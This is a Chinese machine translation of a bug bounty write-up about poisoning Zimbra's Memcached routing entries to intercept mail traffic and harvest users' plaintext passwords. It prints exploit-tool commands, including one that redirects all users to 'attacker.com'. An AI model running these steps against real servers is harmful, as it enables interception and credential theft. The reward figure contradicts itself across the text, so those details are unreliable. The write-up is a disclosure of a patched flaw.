<html>
<head>
<title>Story of a 2.5k Bounty — SSRF on Zimbra Led to Dump All Credentials in Clear Text</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">关于25000英镑赏金的故事——津布拉上的SSRF导致以明文形式转储所有凭证</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/story-of-a-2-5k-bounty-ssrf-on-zimbra-led-to-dump-all-credentials-in-clear-text-6fe826005ccc?source=collection_archive---------0-----------------------#2020-07-02">https://infosecwriteups.com/story-of-a-2-5k-bounty-ssrf-on-zimbra-led-to-dump-all-credentials-in-clear-text-6fe826005ccc?source=collection_archive---------0-----------------------#2020-07-02</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="159e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这篇文章是关于我和我的朋友如何从咖啡馆的bug奖励计划中获得大约2500美元。</p></div><div class="ab cl km kn hu ko" role="separator"><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr"/></div><div class="ij ik il im in"><h1 id="2302" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">初始化</h1><p id="7ecb" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">在侦察阶段，我列举了mailx.hezardastan.net主机，咖啡馆的网络邮件访问。我进行了端口扫描:</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi lw"><img src="../Images/80b7b7c646d811e83cc22b072da2c4ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:1268/format:webp/1*qWVi5QtHy363yQUZ6zEeoQ.png"/></div></figure><p id="b9bd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有许多开放的港口。其中Memcached端口11211异常。经过一些基本测试后，它显示:</p><ol class=""><li id="cc4d" class="me mf iq jp b jq jr ju jv jy mg kc mh kg mi kk mj mk ml mm bi translated">与端口11211通信不需要进行身份验证</li><li id="a8ca" class="me mf iq jp b jq mn ju mo jy mp kc mq kg mr kk mj mk ml mm bi translated">电子邮件地址由Zimbra保存在缓存中</li><li id="ce92" class="me mf iq jp b jq mn ju mo jy mp kc mq kg mr kk mj mk ml mm bi translated">有添加/修改/删除缓存数据的能力</li><li id="19c2" class="me mf iq jp b jq mn ju mo jy mp kc mq kg mr kk mj mk ml mm bi translated">有能力进行DDOS攻击</li></ol><p id="9649" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然而，我在寻找更危险的东西，文件泄露，远程命令执行等。</p></div><div class="ab cl km kn hu ko" role="separator"><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr"/></div><div class="ij ik il im in"><h1 id="a209" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated"><strong class="ak">攻击津布拉</strong></h1><p id="fd30" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">考虑Zimbra源代码:</p><div class="ms mt gp gr mu mv"><a href="https://github.com/fciubotaru/z-pec/blob/master/ZimbraServer/src/java/com/zimbra/cs/util/ProxyPurgeUtil.java" rel="noopener  ugc nofollow" target="_blank"><div class="mw ab fo"><div class="mx ab my cl cj mz"><h2 class="bd ir gy z fp na fr fs nb fu fw ip bi translated">fciubotaru/z-pec</h2><div class="nc l"><h3 class="bd b gy z fp na fr fs nb fu fw dk translated">zimbra fork增加了对RFC6109的支持。在GitHub上创建一个帐户，为fciubotaru/z-pec的开发做出贡献。</h3></div><div class="nd l"><p class="bd b dl z fp na fr fs nb fu fw dk translated">github.com</p></div></div><div class="ne l"><div class="nf l ng nh ni ne nj mc mv"/></div></div></a></div><p id="ecfc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它将通信协议模式、用户名和后端服务器IP地址保存在Memcached中。在此之前，我通过Metasploit，<strong class="jp ir"> memcached_extractor </strong>模块进行了数据提取(可以手动完成):</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/99d82aa65886f8a1d7b96e1bc6add388.png" data-original-src="https://miro.medium.com/v2/resize:fit:1334/format:webp/1*frIvY4zoKt2NenJX_ztq9g.png"/></div></figure><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi nl"><img src="../Images/fbe181f8007a342359b8ac2e2000b44b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7SLrLksRlnuvUspCXxw5jw.png"/></div></div></figure><p id="d5a9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">电子邮件地址可能会被用来进行网络钓鱼或暴力攻击。然而，我仍然不满意这个漏洞。让我们来看看Zimbra的工作流程:</p><ol class=""><li id="57be" class="me mf iq jp b jq jr ju jv jy mg kc mh kg mi kk mj mk ml mm bi translated">用户通过他们的凭证进行身份验证</li><li id="53b3" class="me mf iq jp b jq mn ju mo jy mp kc mq kg mr kk mj mk ml mm bi translated">服务器将用户名和后端服务器URL保存在缓存中</li><li id="a51f" class="me mf iq jp b jq mn ju mo jy mp kc mq kg mr kk mj mk ml mm bi translated">用户使用Zimbra</li><li id="03b0" class="me mf iq jp b jq mn ju mo jy mp kc mq kg mr kk mj mk ml mm bi translated">服务器从缓存中检索后端URL</li><li id="cefc" class="me mf iq jp b jq mn ju mo jy mp kc mq kg mr kk mj mk ml mm bi translated">服务器与连同用户数据一起检索的URL(</li></ol><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi nq"><img src="../Images/18f46948f9215a79cb527bed99e747de.png" data-original-src="https://miro.medium.com/v2/resize:fit:1344/format:webp/1*h6LQaUq-MlZabYC8t5qKVg.png"/></div></figure><p id="037e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">以下是Zimbra如何在缓存中保存数据的示例:</p><pre class="lx ly lz ma gt nr ns nt nu aw nv bi"><span id="4cd4" class="nw ku iq ns b gy nx ny l nz oa">route:proto=imapssl;user=[REDUCTED]@cafebazaar.ir 127.0.0.1:7993<br/>route:proto=pop3ssl;user=[REDUCTED]@cafebazaar.cloud 127.0.0.1:7995<br/>route:proto=httpssl;user=[REDUCTED]@cafebazaar.ir 127.0.0.1:8443</span></pre><p id="db00" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">格式是:</p><pre class="lx ly lz ma gt nr ns nt nu aw nv bi"><span id="0645" class="nw ku iq ns b gy nx ny l nz oa">route:proto=[UserProtocol];user=EmailAddressOrID</span></pre><p id="fe26" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">支持的协议:</p><pre class="lx ly lz ma gt nr ns nt nu aw nv bi"><span id="59b9" class="nw ku iq ns b gy nx ny l nz oa">IMAPSSL 127.0.0.1:7993<br/>POP3SSL 127.0.0.1:7995<br/>HTTPSSL(HTTPS) 127.0.0.1:8443</span></pre><p id="851d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">考虑到后端服务器可以通过互联网访问:</p><pre class="lx ly lz ma gt nr ns nt nu aw nv bi"><span id="6a88" class="nw ku iq ns b gy nx ny l nz oa">IMAPSSL mailx.hezardastan.net:7993<br/>POP3SSL mailx.hezardastan.net:7995<br/>HTTPSSL(HTTPS) mailx.hezardastan.net:8443</span></pre><p id="e6fe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我设计了一个攻击场景，其余部分会解释。</p></div><div class="ab cl km kn hu ko" role="separator"><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr"/></div><div class="ij ik il im in"><h1 id="498a" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">发现SSRF漏洞</h1><p id="fad5" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">场景是针对SSRF测试服务器。攻击场景是将后端服务器IP地址更改为任意地址(攻击者的服务器),以便重定向服务器流量。</p><p id="e578" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">测试SSRF的步骤:</p><ol class=""><li id="547d" class="me mf iq jp b jq jr ju jv jy mg kc mh kg mi kk mj mk ml mm bi translated">通过自签名SSL证书在端口上创建SSL侦听器</li><li id="4a24" class="me mf iq jp b jq mn ju mo jy mp kc mq kg mr kk mj mk ml mm bi translated">更改用户缓存以重定向流量</li></ol><p id="ae94" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通过改变缓存，来自maix.hezardastan.net的连接被接收。</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ob"><img src="../Images/1cb233708337b4b45df3707a216ab40a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XYgJu2j440rAbYcAhXjIfQ.png"/></div></div></figure><p id="dc2c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">SSRF实现了:)</p></div><div class="ab cl km kn hu ko" role="separator"><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr"/></div><div class="ij ik il im in"><h1 id="ed6b" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">中间的人</h1><p id="489a" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">主要目标是<strong class="jp ir">在邮件服务器<strong class="jp ir">正常工作的时候</strong>窃取用户信息</strong>(凭证、电子邮件等)。为了不影响功能，我不得不重定向回流量。考虑到可以从互联网访问的后端开放端口，我可以做这个场景。</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi oc"><img src="../Images/757d4b2506c419b92674d37168da26e2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1386/format:webp/1*5omcpcLOFmdnnqwJtTbNdg.png"/></div></figure><p id="dc38" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">MITM的情况:</p><ol class=""><li id="7e08" class="me mf iq jp b jq jr ju jv jy mg kc mh kg mi kk mj mk ml mm bi translated">用户登录到他们的帐户，后端服务器IP保存在缓存中</li><li id="d289" class="me mf iq jp b jq mn ju mo jy mp kc mq kg mr kk mj mk ml mm bi translated">攻击者将后端信息更改为他们的IP地址</li><li id="9499" class="me mf iq jp b jq mn ju mo jy mp kc mq kg mr kk mj mk ml mm bi translated">Zimbra的流量被重定向到攻击者的服务器</li><li id="20cd" class="me mf iq jp b jq mn ju mo jy mp kc mq kg mr kk mj mk ml mm bi translated">攻击者卸载SSL并提取信息(凭证等)</li><li id="edfb" class="me mf iq jp b jq mn ju mo jy mp kc mq kg mr kk mj mk ml mm bi translated">攻击者对打开的后端端口进行SSL连接</li><li id="48ae" class="me mf iq jp b jq mn ju mo jy mp kc mq kg mr kk mj mk ml mm bi translated">在对用户进行攻击后，攻击者会将缓存恢复到默认值。</li></ol></div><div class="ab cl km kn hu ko" role="separator"><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr"/></div><div class="ij ik il im in"><p id="bdf3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我写了一个<a class="ae kl" href="https://gist.github.com/Voorivex/fa0b2b27cc8caf412b842d1ebe3b8914" rel="noopener ugc nofollow" target="_blank">漏洞利用代码</a>有几个部分:</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi od"><img src="../Images/479723a7f9aefdd66824d5cac2e71b19.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ARVcGAPe3pdrDJyQn_akEQ.png"/></div></div></figure><p id="3f85" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 1。提取已经登录的电子邮件地址</strong></p><pre class="lx ly lz ma gt nr ns nt nu aw nv bi"><span id="ff07" class="nw ku iq ns b gy nx ny l nz oa">python HezarSploit.py -m dumpusers</span></pre><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi oe"><img src="../Images/9c0aec6dfdbc109afe4f436d4f3eaf71.png" data-original-src="https://miro.medium.com/v2/resize:fit:1102/format:webp/1*cE63METc3N2OBU_EEC3Tpg.png"/></div></figure><p id="ce10" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 2。假冒IMAPSSL服务器与客户端通信</strong></p><pre class="lx ly lz ma gt nr ns nt nu aw nv bi"><span id="95b7" class="nw ku iq ns b gy nx ny l nz oa">python HezarSploit.py -m mitm --port 4444</span></pre><p id="1fc4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将凭证转储到<code class="fe of og oh ns b">credentials.txt</code>中。</p><p id="6e24" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 3。修改所有用户(或已经登录的用户)的缓存</strong></p><pre class="lx ly lz ma gt nr ns nt nu aw nv bi"><span id="6e36" class="nw ku iq ns b gy nx ny l nz oa">python HezarSploit.py -m poisoning --user all --ip attacker.com --port 4444</span></pre><p id="64d3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">4.将缓存更改为默认值</p><pre class="lx ly lz ma gt nr ns nt nu aw nv bi"><span id="9a3c" class="nw ku iq ns b gy nx ny l nz oa">python HezarSploit.py -m reset</span></pre></div><div class="ab cl km kn hu ko" role="separator"><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr"/></div><div class="ij ik il im in"><h1 id="aaaa" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">把这一切放在一起，攻击</h1><p id="4f48" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">在服务器中:</p><pre class="lx ly lz ma gt nr ns nt nu aw nv bi"><span id="e8b7" class="nw ku iq ns b gy nx ny l nz oa">python HezarSploit.py -m mitm --port 4444</span></pre><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi oi"><img src="../Images/1a1685ea91ed0008876cab93282193d9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1216/0*3ZOKjcnqNtmpIZ_S"/></div></figure><p id="b50f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在控制台中:</p><pre class="lx ly lz ma gt nr ns nt nu aw nv bi"><span id="0f56" class="nw ku iq ns b gy nx ny l nz oa">python HezarSploit.py -m poisoning --user all --ip attacker.com --port 4444</span></pre><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oj"><img src="../Images/c1f1f14a90512c05e32e7fb44ac95a00.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*hXyUu05SW-T_to0w"/></div></div></figure><p id="ba4f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">结果是:</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ok"><img src="../Images/6c9c88409e2aa3acebafe8c124c56b29.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*e-7Yxi7a1QQ_7546zUz8Fw.png"/></div></div></figure><p id="79ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我得到了几乎所有用户的明文密码。样品:</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi ol"><img src="../Images/2dfc3f5575d695be2560c8e09a1024ee.png" data-original-src="https://miro.medium.com/v2/resize:fit:848/format:webp/1*M55DmQXiS5LpxZL8oqixQA.png"/></div></figure></div><div class="ab cl km kn hu ko" role="separator"><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr"/></div><div class="ij ik il im in"><h1 id="0b1c" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">结束</h1><p id="8be3" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">我报告了这个漏洞，响应速度很快，不到一个小时就修补了漏洞。几天后，他们给了我大约25000美元的奖金。我希望这篇文章对你有用。</p></div></div>    
</body>
</html>